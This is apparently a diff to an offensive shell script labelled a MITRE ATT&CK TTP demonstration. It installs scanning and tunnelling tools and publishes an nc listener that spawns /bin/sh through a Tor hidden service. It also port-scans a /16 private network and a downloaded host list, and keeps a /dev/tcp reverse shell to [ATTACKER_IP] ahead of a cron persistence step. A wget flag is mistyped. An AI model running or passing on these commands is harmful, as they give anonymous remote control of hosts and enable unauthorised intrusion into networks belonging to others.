@@ -83,17 +83,37 @@ apk add --no-cache gcc g++
 apk add --no-cache clang llvm
 
 ## donload address list 
-wget https://gist.githubusercontent.com/jgamblin/62fadd8aa321f7f6a482912a6a317ea3/raw/33c6752125188cfdacdeee3f4fd6e01909e50eef/urls.txt -O url.txt 
+wget https://gist.githubusercontent.com/scrubmx/c02474b2b80fbca721be2fa2d9f203c8/raw/dd0d4b55c4e5c0670ffc182085517dbdad81642a/hosts.csv -0 url2.txt 
 
 ### install nmap  
+apk update
 apk add nmap 
 apk add tor 
 apk add socat 
-apk add clean 
+apk add busybox-extras 
+apk add bash 
+apk add nc 
 
-###
-nmap -iL url.txt 
-nmap -p- 10.0.0.0/16
+# SENARIO -- Reverse Webshell TOr
+## Make Hidden services 
+mkdir -p /etc/tor/hidden_service
+echo "HiddenServiceDir /etc/tor/hidden_service
+HiddenServicePort 80 127.0.0.1:8080" > /etc/tor/torrc
+
+# Start Hidden to Service 
+tor & 
+
+# verify the hostname is correct 
+sleep 10 
+cat /etc/tor/hidden_service/hostname
+
+### Execute nmap 
+nmap -p- 10.0.0.0/16 > localhost.txt
+nmap -iL url2.txt  > results.txt
+
+### Tor Listener
+nc -lvnp 8080 -e /bin/sh
+
 
 # MITRE ATT&CK TTP Demonstration Script
 
@@ -102,7 +122,7 @@ echo "[*] Attempting SSH Access..."
 ssh user@localhost || echo "[!] SSH failed - Continuing..."
 
 echo "[*] Creating reverse shell..."
-bash -i >& /dev/tcp/[ATTACKER_IP]/[PORT] 0>&1 || echo "[!] Reverse shell failed - Continuing..."
+sh -i >& /dev/tcp/[ATTACKER_IP]/[PORT] 0>&1 || echo "[!] Reverse shell failed - Continuing..."
 
 # === Persistence ===
 echo "[*] Adding a cron job for persistence..."
